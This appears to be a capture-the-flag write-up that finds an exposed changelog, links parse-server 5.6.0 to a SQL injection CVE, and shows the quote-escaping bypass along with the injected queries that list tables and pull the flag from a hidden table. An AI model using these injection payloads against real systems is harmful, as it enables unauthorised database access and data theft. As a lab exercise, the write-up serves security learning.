## Recon

Visiting `http://challenges.challenge-ecw.eu:39048/robots.txt` reveals:
```
User-agent: *
Allow: /
Disallow: /CHANGELOG.md
```

We can then visit `http://challenges.challenge-ecw.eu:39048/CHANGELOG.md`
```
# Changelog

All notable changes to this project, will be documented in this file.

## [1.1.0] - 2023-12-10
### Changed
- Upgraded `parse-server` to version 5.6.0 to take advantage of new features.

## [1.0.0] - 2023-10-16
### Added
- Initial release of the project.
- Set up an Express server with `express` v4.17.1 to serve the application.
- Dockerized application setup with PostGIS and Parse Server.
```

## CVE

Googling `parse-server 5.6.0` reveals a [CVE](https://security.snyk.io/vuln/SNYK-JS-PARSESERVER-7414171) related to SQL injection.

Here is the [PR](https://github.com/parse-community/parse-server/commit/2edf1e4c0363af01e97a7fbc97694f851b7d1ff3#diff-06a6bf7bf8f7198c26642684e9c8ecaebb042d28eec43c17171d8054dc675964R2664) that fixes this vulnerability:
```js
-    .replace(/([^'])'/g, `$1''`)
-    .replace(/^'([^'])/, `''$1`);
+    // Ensure even number of single quote sequences by adding an extra single quote if needed;
+    // this ensures that every single quote is escaped
+    .replace(/'+/g, match => {
+      return match.length % 2 === 0 ? match : match + "'";
+    });
```

We could try and understand the regex.. or simply throw an odd number of `'` and see what happens.

Searching for `'''` (`http://challenges.challenge-ecw.eu:39048//api/search?q=%27%27%27`) yields an error:
```
{"code":1,"error":{"length":118,"name":"error","severity":"ERROR","code":"42601","position":"98","file":"scan.l","line":"1123","routine":"scanner_yyerror"}}
```

Yay we have an injection!

Let's list the tables by searching for `'''; SELECT * FROM pg_catalog.pg_tables;--`

We notice 2 interesting tables: `superwellhiddentable` and `SuperWellHiddenTable`.

`SuperWellHiddenTable` (`http://challenges.challenge-ecw.eu:39048//api/search?q=%27%27%27%3BSELECT+%2A+FROM+%22SuperWellHiddenTable%22%3B--`) contains the flag:

```
ECW{Upd@te_YoUr_DEpeNdEnciEs}
```

